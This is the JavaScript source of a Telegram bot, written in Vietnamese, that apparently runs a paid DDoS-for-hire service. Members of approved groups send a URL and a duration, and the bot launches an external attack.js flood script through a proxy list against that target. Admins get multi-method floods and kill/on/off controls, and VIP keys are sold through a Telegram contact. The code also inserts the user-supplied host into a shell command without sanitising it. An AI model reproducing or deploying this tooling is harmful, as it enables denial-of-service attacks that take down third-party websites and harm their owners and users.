const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const fs = require('fs');

const adminIdFile = 'adminid1.txt', allowedGroupIdsFile = 'groupid.txt', blacklistFile = 'blacklist.txt', tokenFile = 'token1.txt';
let token, adminIds = new Set(), allowedGroupIds = new Set(), blacklist = [], botActive = true;
let currentProcesses = 0, queue = [], userProcesses = {}, activeAttacks = {}, botStartTime = Date.now();

// Load token, admin IDs, group IDs, and blacklist from files
const loadConfig = () => {
    try {
        if (!fs.existsSync(tokenFile)) throw new Error('❌ File token.txt không tồn tại.');
        token = fs.readFileSync(tokenFile, 'utf8').trim();
        if (!token) throw new Error('❌ Token không hợp lệ.');

        if (fs.existsSync(adminIdFile)) adminIds = new Set(fs.readFileSync(adminIdFile, 'utf8').split('\n').filter(id => id.trim()));
        if (fs.existsSync(allowedGroupIdsFile)) allowedGroupIds = new Set(fs.readFileSync(allowedGroupIdsFile, 'utf8').split('\n').filter(id => id.trim()));
        if (fs.existsSync(blacklistFile)) blacklist = fs.readFileSync(blacklistFile, 'utf8').split('\n').filter(url => url.trim());

        if (adminIds.size === 0) console.warn('⚠️ File adminid.txt trống hoặc không tồn tại.');
        if (allowedGroupIds.size === 0) console.warn('⚠️ File groupid.txt trống hoặc không tồn tại.');
        if (blacklist.length === 0) console.warn('⚠️ File blacklist.txt trống hoặc không tồn tại.');
    } catch (err) {
        console.error(err.message);
        process.exit(1);
    }
};

loadConfig();
const bot = new TelegramBot(token, { polling: true });

const maxSlot = 1, maxCurrent = 3, maxTimeAttacks = 300;
const helpMessage = `📜 Hướng dẫn sử dụng:
➔ Lệnh chính xác: <code>https://example.com 120</code>
⚠️ Lưu ý: Thời gian tối đa là ${maxTimeAttacks} giây.

🔐 Quyền hạn:
- Admin: Có thể chỉ định thời gian tùy ý (tối đa ${maxTimeAttacks} giây), sử dụng lệnh <code>/pkill</code>, <code>/on</code>, <code>/off</code>.
- Người dùng thường: Thời gian tối đa 120 giây, không thể sử dụng lệnh admin.

💳 Mua Key VIP Ngày/Tuần/Tháng liên hệ @adam022022.`;

const sendHelp = (chatId, caller) => bot.sendMessage(chatId, `${caller ? `@${caller} ` : ''}${helpMessage}`, { parse_mode: 'HTML' });

const initBot = () => {
    bot.on('message', async msg => {
        const { chat: { id: chatId }, text, from: { id: userId, username, first_name }, date } = msg;
        const isAdmin = adminIds.has(userId.toString()), isGroup = allowedGroupIds.has(chatId.toString()), caller = username || first_name;

        if (date * 1000 < botStartTime) return;
        if (!isGroup) return bot.sendMessage(chatId, '❌ Bot chỉ hoạt động trong nhóm được cấp phép. Contact: @adam022022.', { parse_mode: 'HTML' });
        if (!text) return;

        if (text === '/help') return sendHelp(chatId, caller);

        if (text.startsWith('http')) {
            if (!botActive) return bot.sendMessage(chatId, '❌ Bot hiện đang tắt. Chỉ admin có thể bật lại.', { parse_mode: 'HTML' });

            const [host, time, full] = text.split(' ');
            if (!host || isNaN(time)) return bot.sendMessage(chatId, '🚫 Sai định dạng! Nhập theo: <code>https://example.com 120</code>.', { parse_mode: 'HTML' });

            // Kiểm tra blacklist
            const isBlacklisted = blacklist.some(blackUrl => host.includes(blackUrl));
            if (isBlacklisted) return bot.sendMessage(chatId, '❌ Link này đã bị chặn ở blacklist không thể thực hiện lệnh.', { parse_mode: 'HTML' });

            let attackTime = parseInt(time, 10);
            if (isAdmin) attackTime = Math.min(attackTime, maxTimeAttacks);
            else attackTime = Math.min(attackTime, 120);

            if (userProcesses[userId] >= maxSlot) return bot.sendMessage(chatId, `❌ Bạn đã đạt giới hạn số lượng tiến trình (${maxSlot}).`);
            if (currentProcesses >= maxCurrent) {
                queue.push({ userId, host, time: attackTime, chatId, caller });
                return bot.sendMessage(chatId, '⏳ Yêu cầu được đưa vào hàng đợi...', { parse_mode: 'HTML' });
            }

            const pid = Math.floor(Math.random() * 10000), endTime = Date.now() + attackTime * 1000;
            activeAttacks[pid] = { userId, endTime };
            userProcesses[userId] = (userProcesses[userId] || 0) + 1;
            currentProcesses++;

            const methods = full === 'full' && isAdmin ? ['GET', 'POST', 'HEAD'] : ['GET'];
            const startMessage = JSON.stringify({
                Status: "✨🚀🛸 Successfully 🛸🚀✨",
                Caller: caller,
                "PID Attack": pid,
                Website: host,
                Time: `${attackTime} Giây`,
                Maxslot: maxSlot,
                Maxtime: maxTimeAttacks,
                Methods: methods.join(' '),
                ConcurrentAttacks: currentProcesses,
                StartTime: new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })
            }, null, 2);

            await bot.sendMessage(chatId, startMessage, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🔍 Check Host', url: `https://check-host.net/check-http?host=${host}` }, { text: '🌐 Host Tracker', url: `https://www.host-tracker.com/en/ic/check-http?url=${host}` }]] } });

            let completedMethods = 0;
            methods.forEach(method => {
                exec(`node --max-old-space-size=8192 ./attack.js -m ${method} -u ${host} -p live.txt --full true -s ${attackTime}`, { shell: '/bin/bash' }, (e, stdout, stderr) => {
                    completedMethods++;
                    if (completedMethods === methods.length) {
                        const completeMessage = JSON.stringify({ Status: "👽 END ATTACK 👽", Caller: caller, "PID Attack": pid, Website: host, Methods: methods.join(' '), Time: `${attackTime} Giây`, EndTime: new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' }) }, null, 2);
                        bot.sendMessage(chatId, completeMessage, { parse_mode: 'HTML' });
                        delete activeAttacks[pid];
                        userProcesses[userId]--;
                        currentProcesses--;

                        if (queue.length) {
                            const next = queue.shift();
                            bot.sendMessage(next.chatId, `📥 Khởi động từ hàng đợi: ${next.host} ${next.time}s`);
                            bot.emit('message', { chat: { id: next.chatId }, from: { id: next.userId, username: next.caller }, text: `${next.host} ${next.time}` });
                        }
                    }
                });
            });
            return;
        }

        if (text.startsWith('/pkill') || text.startsWith('/on') || text.startsWith('/off')) {
            if (!isAdmin) return bot.sendMessage(chatId, '❌ Bạn không có quyền thực thi lệnh admin. Contact: @adam022022', { parse_mode: 'HTML' });

            if (text.startsWith('/pkill')) {
                exec('pgrep -f attack.js', (e, stdout, stderr) => {
                    if (e || !stdout.trim()) return bot.sendMessage(chatId, '❌ Không tìm thấy tiến trình đang chạy.', { parse_mode: 'HTML' });

                    const pids = stdout.trim().split('\n').join(', ');
                    exec(`pkill -f -9 attack.js`, (e, stdout, stderr) => {
                        if (e) return bot.sendMessage(chatId, '❌ Lỗi khi thực hiện pkill.', { parse_mode: 'HTML' });
                        bot.sendMessage(chatId, `✅ Đã kill hoàn toàn tiến trình. PID: ${pids}`, { parse_mode: 'HTML' });
                    });
                });
                return;
            }

            if (text.startsWith('/on')) {
                botActive = true;
                bot.sendMessage(chatId, '✅ Bot đã được bật.', { parse_mode: 'HTML' });
                return;
            }

            if (text.startsWith('/off')) {
                botActive = false;
                bot.sendMessage(chatId, '✅ Bot đã được tắt.', { parse_mode: 'HTML' });
                return;
            }
        }
    });
};

initBot();
